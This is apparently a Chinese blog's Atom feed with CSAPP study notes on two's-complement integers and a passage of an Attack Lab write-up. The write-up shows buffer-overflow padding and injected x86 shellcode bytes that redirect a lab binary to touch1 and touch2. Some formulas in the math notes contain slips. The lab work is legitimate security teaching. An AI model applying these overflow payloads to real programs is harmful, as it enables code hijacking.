&lt;p&gt;生命是一种力，无所不用其极地把活着与死亡区分开来的力，就像人们竭力把节日和平常区分开来一样——尽管其中并无区别。&lt;/p&gt;
&lt;p&gt;从这个角度来看，求生欲就是生命本身，生命就是一座墓碑。&lt;/p&gt;
&lt;p&gt;墓碑见过吗？在人的坟墓前立一块石头，镌刻上逝者生前的功绩，或者琐事。&lt;/p&gt;
&lt;p&gt;其实我们完全没必要这样做的，但是我们还是做了，这就是人类文明。&lt;/p&gt;</summary>
    
    
    
    <category term="年终总结" scheme="https://amiriox.github.io/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
  </entry>
  
  <entry>
    <title>CSAPP3e第二章(整数的运算)</title>
    <link href="https://amiriox.github.io/2025/01/25/CSAPP-2025-01-25/"/>
    <id>https://amiriox.github.io/2025/01/25/CSAPP-2025-01-25/</id>
    <published>2025-01-25T12:11:15.000Z</published>
    <updated>2025-02-20T15:40:17.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="整数的运算第二章-part2">整数的运算(第二章 Part2)</h1><h2 id="无符号数加法溢出">无符号数加法溢出</h2><p>无符号的数的加法溢出规则很简单, 单纯截取后 <spanclass="math inline">\(w\)</span> 位, 或称对 <spanclass="math inline">\(2^w\)</span> 取模。因此:</p><p><span class="math display">\[x\ +_w^u\ y =\begin{cases}    x + y, &amp; x + y &lt; 2^w, \\    x + y - 2^w, &amp; 2^w \leq x + y &lt; 2^{w+1}.\end{cases}\]</span></p><p>(<span class="math inline">\(+_w^u\)</span> 表示最多 <spanclass="math inline">\(w\)</span> 位下的二进制无符号数加法。下文<spanclass="math inline">\(+_w^t\)</span> 即 <spanclass="math inline">\(w\)</span> 位补码加法)</p><h2 id="检验无符号数加法溢出">检验无符号数加法溢出</h2><p>若 <span class="math inline">\(s = x +_w^u y\)</span>, 当且仅当 <spanclass="math inline">\(s &lt; x\)</span> （或等价地 <spanclass="math inline">\(s &lt; y\)</span>） 时发生溢出。</p><p>(当然, 默认 <span class="math inline">\(x\)</span> 和 <spanclass="math inline">\(y\)</span> 本身不会溢出, 即在 <spanclass="math inline">\([0, UMax_w]\)</span> 的范围内)</p><p>原理易证, 分别证明充分性必要性即可, 注意利用以上公式</p><h2 id="补码加法溢出">补码加法溢出</h2><p>同样是截断,但因为符号位的存在(还记得我们说的为什么补码最后被实际应用吗?因为符号位本身是数值的一部分, 在计算中只要通过对 <spanclass="math inline">\(2^w\)</span> 取模和截断就能运算出正确的数值,类似一种环绕, 本质就是数论上的同余概念)显得略微复杂。</p><p><span class="math display">\[x\ +_w^u\ y =\begin{cases}    x + y - 2^w, &amp; 2^{w-1} \leq x + y, \\    x + y, &amp; -2^{w-1} \leq x + y &lt; 2^{w-1}, \\    x + y + 2^w, &amp; x + y &lt; -2^{w-1}\end{cases}\]</span></p><p>多了就减, 少了就加, 数值都是 <spanclass="math inline">\(2^w\)</span>。</p><p>推导就要用到 ”补码和无符号数的位级操作是一样的“。Formally:</p><p><span class="math display">\[x +_w^t y = U2T(T2U(x) +_w^u T2U(y)\]</span></p><p>(严格应写作 <span class="math inline">\(U2T_w\)</span>, 此处省略)由于里面的两个 <span class="math inline">\(T2U\)</span> 只是可能地加上<span class="math inline">\(2^w\)</span> (当且仅当最高符号位为 <spanclass="math inline">\(1\)</span>), 而这两个带有 <spanclass="math inline">\(2^w\)</span> 的项都被最外面无符号数加法的截断时的<span class="math inline">\(\mod 2^w\)</span> 消除了,所以最后其实就是</p><p><span class="math display">\[x +_w^t y = U2T[(x + y)\mod 2^w].\]</span></p><p>考虑 <span class="math inline">\(U2T\)</span>的公式以及上篇文章经典的那张无符号数转补码的数值对应图,分类讨论即可。</p><h2 id="检查补码加法溢出">检查补码加法溢出</h2><p>令 <span class="math inline">\(s = x +_w^t y\)</span>, 当且仅当 <spanclass="math inline">\(x &gt; 0, y &gt; 0\)</span> 但 <spanclass="math inline">\(s \leq 0\)</span> 或 <span class="math inline">\(x&lt; 0, y &lt; 0\)</span> 但 <span class="math inline">\(s \geq0\)</span> 时发生溢出。当然这里还是默认 <span class="math inline">\(x,y\)</span> 本身在合理的 <span class="math inline">\(w\)</span>位可表示的补码范围内。</p><h2 id="加法逆元">加法逆元</h2><p>感兴趣群论的知识可以去 b 站搜一下, 但实际上此处只是涉及一些概念,浅尝辄止即可。</p><p>模数加法形成 <em>阿尔贝群 (Abelian group)</em> . 也就是说,模数加法可交换、可结合。</p><blockquote><p>还记得那个梗吗？</p><p>判断孩子是否有数学天赋就问孩子为什么 1+ 2 = 2 + 1 ?</p><p>然后孩子说 因为整数集对加法构成阿尔贝群</p></blockquote><p>对于群的操作 “<span class="math inline">\(\cdot\)</span>”和群中的元素 <span class="math inline">\(a\)</span>, <em>单位元</em><span class="math inline">\(e\)</span> 是群中唯一满足 $a e = e $的元素。</p><p><em>逆元</em> 就是对于群中某元素 <spanclass="math inline">\(a\)</span>， <spanclass="math inline">\(a\)</span> 的逆元 <spanclass="math inline">\(a^{-1}\)</span> 满足 <span class="math inline">\(a\cdot a^{-1} = e\)</span></p><p>这个群的单位元是<del>欧元</del> <spanclass="math inline">\(0\)</span> ,</p><p>而 无符号数 <span class="math inline">\(x\)</span>的无符号数加法逆元满足:</p><p><span class="math display">\[-_w^u\ x=\begin{cases}    x, &amp; x = 0, \\    2^w - x, &amp; x &gt; 0.\end{cases}\]</span></p><p>而 补码 <span class="math inline">\(x\)</span>的补码加法逆元满足:</p><p><span class="math display">\[-_w^t\ x=\begin{cases}    x, &amp; x = TMin_w, \\    -x, &amp; x &gt; TMin_w.\end{cases}\]</span></p><h2 id="乘法">乘法</h2><p>无符号数乘法直接按照模 <span class="math inline">\(2^w\)</span> 截断,补码还是按照 <em>位级操作与无符号数相同原理</em>先分别转换成无符号数再按照无符号乘法计算位模式,最后转换为补码的数值。</p><h3 id="乘以-2-的幂次">乘以 2 的幂次</h3><p>一个常识是乘以 <span class="math inline">\(2^k\)</span> 就等价于左移<span class="math inline">\(k\)</span>位。虽然这一点显而易见也易于证明(通过公式定义即可),但其实有一些可以说的地方, 例如 <span class="math inline">\(x \cdot 14 =(x &lt;&lt; 3) + (x &lt;&lt; 2) + (x &lt;&lt; 1) = x \cdot (x &lt;&lt;4) - (x &lt;&lt; 1)\)</span></p><p>具体来说, 如果一个表达式 <span class="math inline">\(x \cdotk\)</span> 的 <span class="math inline">\(k\)</span> 能表示为 <spanclass="math inline">\([(0...0)(1...1)(0...0)...(1...1)]\)</span>即一段的 <span class="math inline">\(0\)</span> 和一段的 <spanclass="math inline">\(1\)</span> 的序列，考虑一组从位置 <spanclass="math inline">\(l\)</span> 到 位置 <spanclass="math inline">\(r\)</span> 的 <spanclass="math inline">\(1\)</span> 序列 <span class="math inline">\((l\leq r)\)</span>, 这个位对乘积的影响可以表达为两个形式:(注意虽然 <spanclass="math inline">\(l \leq r\)</span>但其实二进制表示上下标大的在前面)</p><p><span class="math inline">\((x&lt;&lt;r) + (x&lt;&lt;(r-1)) + ... +(x &lt;&lt; l)\)</span> 或</p><p><span class="math inline">\((x &lt;&lt; (r + 1)) - (x &lt;&lt;l)\)</span></p><p>其实还可以想一想当 <span class="math inline">\(l, r\)</span>为什么条件时第一种更好(左移和加减次数最少),为什么条件时第二种更好。这也是 CSAPP 的习题之一。</p><h3 id="除以-2-的幂次">除以 2 的幂次</h3><p>你可能会想, 不就是右移 <span class="math inline">\(k\)</span>位？但右移 <span class="math inline">\(k\)</span> 位计算的是 <spanclass="math inline">\(\lfloor x / 2^k \rfloor\)</span>,而一般的编程语言中除法是<strong>向零取整</strong>(即舍去小数点)而不是向下取整的(这点是程序设计课重灾区)。而大多数OIer 或 ACMer 应该都很熟悉向上取整的方法: $a / b = (a + b - 1) / b$。如果 <span class="math inline">\(a \mod b == 0\)</span> 那么 <spanclass="math inline">\(b - 1\)</span> 会直接被向下取整舍掉,否则就会令结果 <span class="math inline">\(+1\)</span>。</p><p>因此有 C 语言表达式<code>(x &lt; 0 ? x + (1 &lt;&lt; k) - 1 : x) &gt;&gt; k</code> 计算数值<span class="math inline">\(x / 2^k\)</span>。</p><p>这个向上取整的方法叫做 <em>偏置(biasing)</em> . 我们甚至还可以用右移<span class="math inline">\(31\)</span> 位再 and上掩码等各种手段判负从而优化掉条件语句 <del>这也是习题</del></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;整数的运算第二章-part2&quot;&gt;整数的运算(第二章 Part2)&lt;/h1&gt;
&lt;h2 id=&quot;无符号数加法溢出&quot;&gt;无符号数加法溢出&lt;/h2&gt;
&lt;p&gt;无符号的数的加法溢出规则很简单, 单纯截取后 &lt;span class=&quot;math inline&quot;&gt;&#92;(w&#92;)&lt;/span&gt; 位, 或称对 &lt;span class=&quot;math inline&quot;&gt;&#92;(2^w&#92;)&lt;/span&gt; 取模。因此:&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;math display&quot;&gt;&#92;[
x&#92; +_w^u&#92; y =
&#92;begin{cases}
    x + y, &amp;amp; x + y &amp;lt; 2^w, &#92;&#92;
    x + y - 2^w, &amp;amp; 2^w &#92;leq x + y &amp;lt; 2^{w+1}.
&#92;end{cases}
&#92;]&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;(&lt;span class=&quot;math inline&quot;&gt;&#92;(+_w^u&#92;)&lt;/span&gt; 表示最多 &lt;span class=&quot;math inline&quot;&gt;&#92;(w&#92;)&lt;/span&gt; 位下的二进制无符号数加法。下文&lt;span class=&quot;math inline&quot;&gt;&#92;(+_w^t&#92;)&lt;/span&gt; 即 &lt;span class=&quot;math inline&quot;&gt;&#92;(w&#92;)&lt;/span&gt; 位补码加法)&lt;/p&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP3e第二章(整数的表示)</title>
    <link href="https://amiriox.github.io/2025/01/19/CSAPP-2025-01-19/"/>
    <id>https://amiriox.github.io/2025/01/19/CSAPP-2025-01-19/</id>
    <published>2025-01-19T02:43:30.000Z</published>
    <updated>2025-02-20T15:40:21.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="整数的表示第二章-part1">整数的表示(第二章 Part1)</h1><p><del>博客还没装 Mathjax 插件，所以下面的 <spanclass="math inline">\(\LaTeX\)</span> 应该都是乱的</del> 已修</p><h2 id="整数表示">整数表示</h2><p>这一段如果没有目的和顺序地硬看会觉得关系很多很复杂，但其实只要按照一定的目的和顺序结构就会很清晰。</p><h3 id="以设计者的视角思考如何设计">以设计者的视角思考如何设计</h3><p>如果我们是设计用二进制表示整数的人，我们需要如何表示二进制？</p><p>利用 <span class="math inline">\(w\)</span> 位二进制的最高位 $x_{w-1} $ 为 <span class="math inline">\(1\)</span>代表这个数是负数，剩下的部分正常用二进制表示即 <spanclass="math inline">\(\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p><p>但显然光表示是完全不够的，我们还需要运算，<strong>而符号位由于不对具体数值做贡献，会导致运算错误。</strong>因此我们需要让符号位也代表数值，用另一种映射方式计算，于是我们令最高位的符号位具有负的权重<span class="math inline">\(-x_{w-1} \cdot2^{w-1}\)</span>，这样符号位也参与了计算。但是这样数值又对不上了，因此我们需要把后面的位也变一下。由于我们不是真的设计师，所以我们直接看答案：取反后面的每一位后再+1。例如<code>10010</code><strong>除符号位</strong>取反后变为<code>11101</code>，+1后是<code>11110</code>。这样的表示方法计算出的数值是 <spanclass="math inline">\(-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span>如何论证这样的数值是对的呢？</p><p>我们称<code>10010</code> <code>11101</code> <code>11110</code>这样的二进制形式为<em>位模式</em>或<em>位向量</em>。Formally, <spanclass="math inline">\(w\)</span> 位的位向量 <spanclass="math inline">\(\vec{x_w}=[x_{w-1}, x_{w-2}, ..., x_1,x_0]\)</span> (其中 <span class="math inline">\(x \in \{0, 1\}, \text{where } x \in\mathbb{Z}\)</span>)。另外，称一开始的符号位不参与计算的位模式为<em>原码</em>，除符号位取反后的位模式为<em>反码</em>，取反后+1的为<em>补码</em>。我们还将<strong>以无符号整数形式</strong>(即所有位模式都是<span class="math inline">\(2^{i}\)</span>的权值)<strong>解释位模式所计算出的十进制数值</strong>这个过程写作一个函数<span class="math inline">\(B2U(\vec{x_w})\)</span> 即 Binary toUnsigned，易得<span class="math inline">\(B2U(\vec{x_w}) =\displaystyle\sum_{i=0}^{w-1}x_i\cdot2^i\)</span>。类似地，我们有<strong>以反码形式解释位模式所计算出的十进制数值</strong><span class="math inline">\(B2O(\vec{x_w})\)</span>和<strong>以补码形式解释位模式所计算出的十进制数值</strong> <spanclass="math inline">\(B2T(\vec{x_w})\)</span>。对应地，我们也有这些函数的反函数<spanclass="math inline">\(U2B(x), T2B(x), O2B(x)\)</span>。</p><p>则我们需要证明的问题以数学语言描述就是，设 <spanclass="math inline">\(B2T(\vec{x_w}\prime) =-x_{w-1}\prime\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\prime\cdot2^i\)</span>那么我们需要表示的数值 <span class="math inline">\(x =-\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i =B2T(\vec{x_w}\prime)\)</span>, 其中 <spanclass="math inline">\(\vec{x}\prime\)</span> 是 <spanclass="math inline">\(T2B(x)\)</span> 即原码 <spanclass="math inline">\(\vec{x_w}\)</span> 取反后 +1的位模式。(正数的无符号表示、原码、反码、补码都一样，以下只考虑负数)</p><p>考虑到 +1 导致的进位影响我们对 <spanclass="math inline">\(\vec{x_w}\prime\)</span> 的表达，我们借助反码<span class="math inline">\(\vec{x_w}\prime\prime\)</span>，根据定义得知<span class="math inline">\(B2O(\vec{x_w}\prime\prime) + 1 =B2T(\vec{x_w}\prime)\)</span> 。则 <spanclass="math inline">\(x_i\prime\prime = (1 -x_i)\)</span>一个连等式就能证明全部：</p><p><del>(沟槽的 hexo-filter-mathjax 插件有 Bug，我本地 MarkText 的Mathjax 正常解析多行，这里就变单行了，对付看罢。)</del> 已修</p><p><span class="math display">\[\begin{aligned}x &amp;= -\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i \\  &amp;= -2^{w-1} + 2^{w-1} - 1 -\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i + 1 \\  &amp;= -2^{w-1} + \displaystyle\sum_{i=0}^{w-2}2^i -\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i + 1 \\  &amp;= -2^{w-1} + \displaystyle\sum_{i=0}^{w-2}(1-x_i)\cdot2^i + 1\end{aligned}\]</span></p><p>其中 <span class="math inline">\((1-x_i)\)</span> 即反码的位模式<span class="math inline">\(x_i\prime\prime\)</span>，这样我们证明了补码的数值转换函数<spanclass="math inline">\(B2T(\vec{x_w}) =-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span>的数值表示是正确的(实际上这个函数是一个双射)，而此时符号位也参与了运算，所以这套表示体系也能正常参与运算（后面会更详细地说明运算问题）</p><blockquote><p>事实上，补码也能正常参与运算，只是对 0 的表示有两种 (0000 和 1111)。</p><p>给出补码的数值转换函数 <span class="math inline">\(B2O =-x_{w-1}\cdot(2^{w-1}-1)+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p></blockquote><h3 id="如何取负">如何取负？</h3><p>既然我们有了补码的定义，很容易就知道对一个数 <spanclass="math inline">\(x\)</span> 取相反数就是令 <spanclass="math inline">\(x\)</span> 的补码 <spanclass="math inline">\(\vec{x_w}\)</span> <strong>所有位</strong>取反然后再 +1。</p><blockquote><p>Q: 为什么是所有位取反？补码不是除符号位取反再 +1 吗？</p><p>A: 取相反数符号位肯定要变化啊。我们是+3 -&gt; -3</p></blockquote><p>注意到这个其实就是 <span class="math inline">\(-x = (2^w - x) \mod2^w\)</span>，注意不到也没关系，<del>因为我就没注意到</del>，后面还会继续说这个事。</p><blockquote><p>想一想，设 <span class="math inline">\(\mathrm{TMin}\)</span> 为<span class="math inline">\(w\)</span> 位补码表示的最小数值，那么：</p><ul><li><p><span class="math inline">\(\mathrm{TMin}\)</span>的补码位模式(即 <span class="math inline">\(T2B(\mathrm{TMin})\)</span>) 是多少？</p></li><li><div class="sourceCode" id="cb1"><preclass="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>  <span class="dt">int</span> custom_abs<span class="op">(</span><span class="dt">signed</span> <span class="dt">int</span> x<span class="op">)</span> <span class="op">&#123;</span></span><span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span><span class="op">(</span>x <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="cf">return</span> <span class="op">-</span>x<span class="op">;</span></span><span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> x<span class="op">;</span></span><span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  <span class="op">&#125;</span></span></code></pre></div><p>这段代码有什么问题？</p></li></ul></blockquote><h3 id="补码的不对称性">补码的不对称性</h3><p>根据上面的问题，我们发现 <code>custom_abs(TMin)</code> 返回的还是TMin.</p><p>在补码语境下，由于符号位是 1 表示的都是正数，符号位是 0的表示的都是非负数，这两者表示的数字个数相等，而 0不是正数也不是负数，但它是非负数，所以表示的正数比负数少一个，所以 <spanclass="math inline">\(\mathrm{TMax + 1 = abs(TMin)}\)</span> , 例如对 4字节正数，最大值是 <span class="math inline">\(2^{31} - 1 =2147483647\)</span>, 而最小值是 <span class="math inline">\(-2^{31} =-2147483648\)</span>。</p><blockquote><p>在 C 和 C++语言中，<code>unsigned</code>修饰的无符号数以无符号形式解释，即我们的<span class="math inline">\(B2U\)</span>， 其他的则以补码解释。</p><p>Java 以补码解释。Rust <code>i32</code> <code>i64</code>等以补码表示，<code>u32</code> 等以无符号数形式解释。</p><p>C 和 C++ 的 <code>unsigned</code>溢出是行为良好的，上下溢出都是循环，但有符号正数的溢出是未定义行为。注意浮点数的溢出也是行为良好的，因为IEEE 754 规定了溢出产生正负无穷。</p><p>Java 的溢出是行为良好的，按照补码规则循环环绕到最小值</p><p>Rust 的溢出取决于编译模式，<code>Debug</code>模式会触发<code>panic</code> ，<code>Release</code> 模式类似 Java。</p><p>Python不太清楚具体怎么表示的，理论上只要内存够应该不存在溢出的情况？我还在学py。</p></blockquote><h3 id="无符号数解释和补码解释的关系">无符号数解释和补码解释的关系</h3><p>对于一个位模式 <span class="math inline">\(\vec{x_w}\)</span>以无符号数解释的数值 <span class="math inline">\(B2U(\vec{x_w})\)</span>和以补码解释的数值 <span class="math inline">\(B2T(\vec{x_w})\)</span>有什么关系？考虑这两者的公式（设 <span class="math inline">\(x_{w-1} =1\)</span> )：</p><p><span class="math inline">\(B2U(\vec{x_w}) =\displaystyle\sum_{i=0}^{w-1}x_i\cdot2^i =x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p><p><span class="math inline">\(B2T(\vec{x_w}) =-x_{w-1}\cdot2^{w-1}+\displaystyle\sum_{i=0}^{w-2}x_i\cdot2^i\)</span></p><p>发现只有最高为的权重正负不同，即两者只差 <spanclass="math inline">\(2 \times 2^{w-1} = 2^w\)</span></p><p>当然如果是正数，<span class="math inline">\(x_{w-1} = 0\)</span>则二者相等。</p><p>故：<span class="math inline">\(B2U(\vec{x_w}) - 2^w =B2T(\vec{x_w})\)</span></p><p>于是就有了这个经典的图：</p><p><img src="../images/2025-01-19-122537_hyprshot.png" /></p><h3 id="取相反数">取相反数</h3><p>我们上面说了取相反数就是 <span class="math inline">\(-x = (2^w - x)\mod 2^w\)</span> .下面来证明一下。</p><p>Formaly, 我们需要证明 <span class="math inline">\(U2B(2^w - b) =T2B(-b)\)</span> ,急症 $B2T(U2B(2^w - b)) = -b $</p><p>由上面说到的 <span class="math inline">\(B2U(\vec{x_w}) - 2^w =B2T(\vec{x_w})\)</span> ，令 <span class="math inline">\(x = U2B(2^w -b)\)</span></p><p>得 <span class="math inline">\(B2T(U2B(2^w - b)) = B2U(U2B(2^w - b))- 2^2 = 2^w - b - 2^w = -b\)</span></p><p>得证。</p><p>举个例子:</p><p><span class="math inline">\(T2B(-3) = U2B(2^w - 3) =T2B(-3)\)</span></p><h3 id="扩展和截断">扩展和截断</h3><p>无符号数扩展直接补 <span class="math inline">\(0\)</span> 在前面,补码扩展在前面补 <span class="math inline">\(1\)</span>,可以证明是正确的。</p><p>截断无符号数相当于对 <span class="math inline">\(2^k\)</span> 取模,截断补码相当于位模式下截断无符号数再转换为补码表示。</p><p>换句话说就是：无符号数和补码的操作在位级表示上是相同的,这一点会在后面大量用到。</p><h3 id="总结">总结:</h3><p>这里我们用数学公式以权重的方式解释了补码的表示原理和常用的转换关系。</p><p>从不过这部分的知识可以以更优雅的方式即群论表示。</p><p>补码实际上就是模 <span class="math inline">\(2^w\)</span>的同余群。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;整数的表示第二章-part1&quot;&gt;整数的表示(第二章 Part1)&lt;/h1&gt;
&lt;p&gt;&lt;del&gt;博客还没装 Mathjax 插件，所以下面的 &lt;span class=&quot;math inline&quot;&gt;&#92;(&#92;LaTeX&#92;)&lt;/span&gt; 应该都是乱的&lt;/del&gt; 已修&lt;/p&gt;
&lt;h2 id=&quot;整数表示&quot;&gt;整数表示&lt;/h2&gt;
&lt;p&gt;这一段如果没有目的和顺序地硬看会觉得关系很多很复杂，但其实只要按照一定的目的和顺序结构就会很清晰。&lt;/p&gt;
&lt;h3 id=&quot;以设计者的视角思考如何设计&quot;&gt;以设计者的视角思考如何设计&lt;/h3&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Attack Lab 笔记</title>
    <link href="https://amiriox.github.io/2024/12/29/CSAPP-Lab-Attack/"/>
    <id>https://amiriox.github.io/2024/12/29/CSAPP-Lab-Attack/</id>
    <published>2024-12-29T13:53:00.000Z</published>
    <updated>2025-02-13T16:11:18.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phase-0x1">Phase 0x1</h2><p>一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1</p><p><code>gdb ctarget</code> 然后 <code>set args -q</code>防止与不存在的服务器通信（<code>run -q</code> 也可以)<code>b Gets</code> <code>run -q</code></p><p>看一下栈信息:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────[ STACK ]────────────────────────</span><br><span class="line">00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax</span><br><span class="line">01:0008│ rdi 0x5561dc78 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0</span><br><span class="line">06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx</span><br><span class="line">07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* &#x27;hqi:&#x27; */</span><br></pre></td></tr></table></figure><p>rsp 是当前栈顶指针，由于是在 Gets 的开头查看的，所以栈顶存的就是 Gets的返回地址</p><p>思路应该是覆盖栈顶指针 <code>0x5561dc70</code> 处的 正确返回地址为<code>touch1</code> 的地址<code>0x4017c0</code></p><p>如何覆盖？看一下读入字符串的逻辑：</p><p><code>_IO_getc@plt</code> 很明显是库函数 getchar()<br />那附近是一个循环，如果是 -1 (<code>0x7ffffffff</code>) 就跳出，<br />如果不是 0xA (经查表这个就是 ASCII 的行分隔符）就读入下一个 char</p><p>那就看一下读入单个字符的逻辑<br />$rbx = $rdi, 推测 $rdi 作为 Gets()的第一个参数就是存到的字符串地址<br />也就是说 (%rdi) 应该就是我们输入的字符串存储地址的第一位当然这里因为要调用 <code>_IO_getc</code> 并且 rdi是调用者保存寄存器<br />所以先用 rbx 存一下 rdi</p><p>看了下 Gets 的 $rdi 存的是 <code>0x5561dc78</code><br />发现其实缓冲区不在 Gets() 的栈帧里(78 &gt; 70, 栈内存向低地址增长）…</p><p>重新观察 <code>getbuf</code> 的汇编代码，发现<code>sub $0x28, %rsp</code>，分配了 40 字节的缓冲区<br />由于缓冲区栈溢出攻击的原理大概是这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 注意这个栈是从高地址向低地址增加的</span><br><span class="line"></span><br><span class="line">+------------------------+ 高地址</span><br><span class="line">| caller 返回地址        | &lt;- 函数返回时跳转的位置 0x5561dca0</span><br><span class="line">+------------------------+</span><br><span class="line">| buffer[40]             | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]             |</span><br><span class="line">| ...                    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]              |</span><br><span class="line">| buffer[0]              | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+------------------------+ 低地址</span><br></pre></td></tr></table></figure><p>所以只能向相对缓冲区更高的地址溢出，于是换个思路，在 getbuf 处 ret 到<code>touch1()</code><br />所以就不用考虑 Gets 的细节了，一共 40 字节的 buffer, 直接填充 40 个<code>00</code>，<br />然后填充 <code>c0 17 40</code> 即可(gdb 中在 getbuf 起始处看 %rsp也能发现就是 <code>0x5561dca0 = 0x5561dc78 + 0x28</code> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure><p>一个地址对应的通常是一字节，而一个十六进制的每个位数是 4 个二进制位(1111=15=f)</p><p>两个十六进制位就是一字节。</p><p>由于只有网络协议相关会用大端法，所以这里是小端法，地址小的位置存的是低位</p><p>至于 <code>hex2raw</code> (Hexadecimal to Raw), 其实就是<code>echo -n -e "\xc0\x17\x40"</code></p><h2 id="phase-0x2">Phase 0x2</h2><p>要求将 <code>cookie.txt</code> 作为参数传递给 <code>touch2()</code>并调用</p><p>至此调用函数我们已经非常熟悉了，直接填充对应函数的地址到溢出后的位置即可。<br />但是我们还需要传递参数，所以就不能再填充 <code>00</code> 了。<br />这个 <code>ctarget</code>编译时是关闭栈保护的，也就是说栈内存上的代码可以直接被执行。</p><p>编写 <code>phase2_inject.asm</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov      $0x59b997fa, %rdi</span><br><span class="line">pushq    $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>其中，<code>0x59b997fa</code> 是 cookie，<code>0x4017ec</code> 是<code>touch2()</code> 的地址。<br />当然这个是 AT&amp;T 的语法，<code>nasm</code> 默认似乎是 Intel，所以我用<code>as</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">as phase2_inject.asm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -d a.out</span></span><br><span class="line"></span><br><span class="line">a.out:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3</span><br></pre></td></tr></table></figure><p>于是得到了我们的 <code>inraw.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 90 </span><br><span class="line">68 ec 17 40 00 90 90 90 </span><br><span class="line">c3 00 00 00 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 